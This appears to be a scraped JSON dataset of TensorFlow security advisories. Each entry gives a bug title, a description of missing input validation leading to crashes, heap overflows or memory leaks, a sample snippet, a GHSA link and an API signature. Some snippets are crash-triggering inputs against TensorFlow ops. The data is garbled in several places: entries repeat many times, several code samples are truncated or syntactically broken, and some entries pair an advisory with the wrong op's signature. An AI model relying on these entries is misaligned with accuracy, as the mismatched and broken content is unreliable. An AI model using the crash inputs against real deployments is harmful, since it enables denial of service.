    "Bug description": "The  tf.raw_ops.DataFormatVecPermute  API does not validate the  src_format  and  dst_format  attributes.  The code  assumes that these two arguments define a permutation of  NHWC .",
    "Sample Code": ">>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [],\n       [1852793632, 1852793632]], dtype=int32)>",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "API Signature": "tf.raw_ops.DataFormatVecPermute(\n    x, src_format='NHWC', dst_format='NCHW', name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in data format attributes\n      ",
    "Bug description": "The  tf.raw_ops.DataFormatVecPermute  API does not validate the  src_format  and  dst_format  attributes.  The code  assumes that these two arguments define a permutation of  NHWC .",
    "Sample Code": ">>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [],\n       [1852793632, 1852793632]], dtype=int32)>",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "API Signature": "tf.raw_ops.DataFormatVecPermute(\n    x, src_format='NHWC', dst_format='NCHW', name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in data format attributes\n      ",
    "Bug description": "The  tf.raw_ops.DataFormatVecPermute  API does not validate the  src_format  and  dst_format  attributes.  The code  assumes that these two arguments define a permutation of  NHWC .",
    "Sample Code": ">>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [],\n       [1852793632, 1852793632]], dtype=int32)>",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "API Signature": "tf.raw_ops.DataFormatVecPermute(\n    x, src_format='NHWC', dst_format='NCHW', name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in data format attributes\n      ",
    "Bug description": "The  tf.raw_ops.DataFormatVecPermute  API does not validate the  src_format  and  dst_format  attributes.  The code  assumes that these two arguments define a permutation of  NHWC .",
    "Sample Code": ">>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [],\n       [1852793632, 1852793632]], dtype=int32)>",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "API Signature": "tf.raw_ops.DataFormatVecPermute(\n    x, src_format='NHWC', dst_format='NCHW', name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in data format attributes\n      ",
    "Bug description": "The  tf.raw_ops.DataFormatVecPermute  API does not validate the  src_format  and  dst_format  attributes.  The code  assumes that these two arguments define a permutation of  NHWC .",
    "Sample Code": ">>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [],\n       [1852793632, 1852793632]], dtype=int32)>",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "API Signature": "tf.raw_ops.DataFormatVecPermute(\n    x, src_format='NHWC', dst_format='NCHW', name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in data format attributes\n      ",
    "Bug description": "The  tf.raw_ops.DataFormatVecPermute  API does not validate the  src_format  and  dst_format  attributes.  The code  assumes that these two arguments define a permutation of  NHWC .",
    "Sample Code": ">>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [],\n       [1852793632, 1852793632]], dtype=int32)>",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "API Signature": "tf.raw_ops.DataFormatVecPermute(\n    x, src_format='NHWC', dst_format='NCHW', name=None\n)\n"
  },
  {
    "Title": "\n        Lack of validation in data format attributes\n      ",
    "Bug description": "The  tf.raw_ops.DataFormatVecPermute  API does not validate the  src_format  and  dst_format  attributes.  The code  assumes that these two arguments define a permutation of  NHWC .",
    "Sample Code": ">>> dst_format='8765')\n<tf.Tensor: shape=(4, 2), dtype=int32, numpy=\narray([[1954047348, 1954047348],\n       [1852793646, 1852793646],\n       [1954047348, 1954047348],\n       [],\n       [1852793632, 1852793632]], dtype=int32)>",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7",
    "API Signature": "tf.raw_ops.DataFormatVecPermute(\n    x, src_format='NHWC', dst_format='NCHW', name=None\n)\n"
  },
  {
    "Title": "\n        Float cast overflow undefined behavior\n      ",
    "Bug description": "When the  boxes  argument of  tf.image.crop_and_resize  has a very large value, the CPU kernel implementation receives it as a C++  nan  floating point value. Attempting to operate on this is undefined behavior which later produces a segmentation fault.",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xwhf-g6j5-j5gc",
    "API Signature": "tf.image.crop_and_resize(\n    image,\n    boxes,\n    box_indices,\n    crop_size,\n    method='bilinear',\n    extrapolation_value=0.0,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Type confusion during tensor casts lead to dereferencing null pointers\n      ",
    "Bug description": "Calling TF operations with tensors of non-numeric types when the operations expect numeric tensors result in null pointer dereferences.",
    "Sample Code": "import numpy as np\n\nwriter_array = np.array([1,2],dtype=np.int32)\n)\nwriter_tensor = tf.convert_to_tensor(writer_array,dtype=tf.resource)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-452g-f7fp-9jf7",
    "API Signature": "tf.random.truncated_normal(\n    shape,\n    mean=0.0,\n    stddev=1.0,\n    dtype=tf.dtypes.float32,\n    seed=None,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Segfault in `tf.quantization.quantize_and_dequantize`\n      ",
    "Bug description": "An attacker can pass an invalid  axis  value to  tf.quantization.quantize_and_dequantize :",
    "Sample Code": ".quantization.quantize_and_dequantize(\n    input=[2.5, 2.5], input_min=[0,0], input_max=[1,1], axis=10)",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rrfp-j2mp-hq9c",
    "API Signature": "tf.quantization.quantize_and_dequantize(\n    input,\n    input_min,\n    input_max,\n    signed_input=True,\n    num_bits=8,\n    range_given=False,\n    round_mode='HALF_TO_EVEN',\n    name=None,\n    narrow_range=False,\n    axis=None\n)\n"
  },
  {
    "Title": "\n        Undefined behavior in dlpack\n      ",
    "Bug description": "If a user passes an invalid argument to  dlpack.to_dlpack  the expected validations will cause variables to bind to  nullptr  while setting a  status  variable to the error condition.",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q8qj-fc9q-cphr",
    "API Signature": "tf.experimental.dlpack.to_dlpack(\n    tf_tensor\n)\n"
  },
  {
    "Title": "\n        Memory leak in dlpack\n      ",
    "Bug description": "If a user passes a list of strings to  dlpack.to_dlpack  there is a memory leak following an expected validation failure: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8fxw-76px-3rxv",
    "API Signature": "tf.experimental.dlpack.to_dlpack(\n    tf_tensor\n)\n"
  },
  {
    "Title": "\n        Crash due to invalid shape of grad_values in SparseFillEmptyRowsGrad\n      ",
    "Bug description": "The  SparseFillEmptyRowsGrad  implementation has incomplete validation of the shapes of its arguments: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9mqp-7v2h-2382",
    "API Signature": "tf.raw_ops.SparseFillEmptyRowsGrad(\n    reverse_index_map, grad_values, name=None\n)\n"
  },
  {
    "Title": "\n        Crash due to invalid splits in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has rank 2. This tensor must be a matrix because code assumes its elements are accessed as elements of a matrix: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Crash due to invalid splits in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has rank 2. This tensor must be a matrix because code assumes its elements are accessed as elements of a matrix: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Crash due to invalid splits in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has rank 2. This tensor must be a matrix because code assumes its elements are accessed as elements of a matrix: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Crash due to invalid splits in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has rank 2. This tensor must be a matrix because code assumes its elements are accessed as elements of a matrix: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Crash due to invalid splits in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has rank 2. This tensor must be a matrix because code assumes its elements are accessed as elements of a matrix: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Abort due to invalid splits in RaggedCountSparseOutput\n      ",
    "Bug description": "The  RaggedCountSparseOutput  does not validate that the input arguments form a valid ragged tensor. In particular, there is no validation that the  splits  tensor has the minimum required number of elements. Code uses this quantity to initialize a different data structure: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Abort due to invalid splits in RaggedCountSparseOutput\n      ",
    "Bug description": "The  RaggedCountSparseOutput  does not validate that the input arguments form a valid ragged tensor. In particular, there is no validation that the  splits  tensor has the minimum required number of elements. Code uses this quantity to initialize a different data structure: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h",
    "API Signature": "tf.raw_ops.SparseCountSparseOutput(\n    indices,\n    values,\n    dense_shape,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Abort due to invalid splits in RaggedCountSparseOutput\n      ",
    "Bug description": "The  RaggedCountSparseOutput  does not validate that the input arguments form a valid ragged tensor. In particular, there is no validation that the  splits  tensor has the minimum required number of elements. Code uses this quantity to initialize a different data structure: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h",
    "API Signature": "tf.raw_ops.RaggedCountSparseOutput(\n    splits,\n    values,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow due to invalid indices in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has the same shape as the  values  one. The values in these tensors are always accessed in parallel: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3",
    "API Signature": "tf.raw_ops.RaggedCountSparseOutput(\n    splits,\n    values,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow due to invalid indices in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has the same shape as the  values  one. The values in these tensors are always accessed in parallel: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3",
    "API Signature": "tf.raw_ops.RaggedCountSparseOutput(\n    splits,\n    values,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow due to invalid indices in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has the same shape as the  values  one. The values in these tensors are always accessed in parallel: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3",
    "API Signature": "tf.raw_ops.RaggedCountSparseOutput(\n    splits,\n    values,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow due to invalid indices in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has the same shape as the  values  one. The values in these tensors are always accessed in parallel: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3",
    "API Signature": "tf.raw_ops.RaggedCountSparseOutput(\n    splits,\n    values,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow due to invalid indices in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has the same shape as the  values  one. The values in these tensors are always accessed in parallel: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3",
    "API Signature": "tf.raw_ops.RaggedCountSparseOutput(\n    splits,\n    values,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Heap buffer overflow due to invalid indices in SparseCountSparseOutput\n      ",
    "Bug description": "The  SparseCountSparseOutput  implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the  indices  tensor has the same shape as the  values  one. The values in these tensors are always accessed in parallel: \n",
    "Sample Code": "",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3",
    "API Signature": "tf.raw_ops.RaggedCountSparseOutput(\n    splits,\n    values,\n    weights,\n    binary_output,\n    minlength=-1,\n    maxlength=-1,\n    name=None\n)\n"
  },
  {
    "Title": "\n        Data leak in `tf.raw_ops.StringNGrams`\n      ",
    "Bug description": "The  data_splits  argument of  tf.raw_ops.StringNGrams  lacks validation. This allows a user to pass values that can cause heap overflow errors and even leak contents of memory",
    "Sample Code": "StringNGrams(ngrams=<tf.Tensor: shape=(6,), dtype=string, numpy=\narray([b'aa bb cc', b'bb cc dd', b'cc dd ee', b'dd ee ff',\n       b'ee ff ,\n       ,\n       b'ff ],...",
    "Link": "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g7p5-5759-qv46",
    "API Signature": "tf.raw_ops.StringNGrams(\n    data,\n    data_splits,\n    separator,\n    ngram_widths,\n    left_pad,\n    right_pad,\n    pad_width,\n    preserve_short_sequences,\n    name=None\n)\n"
  }
]
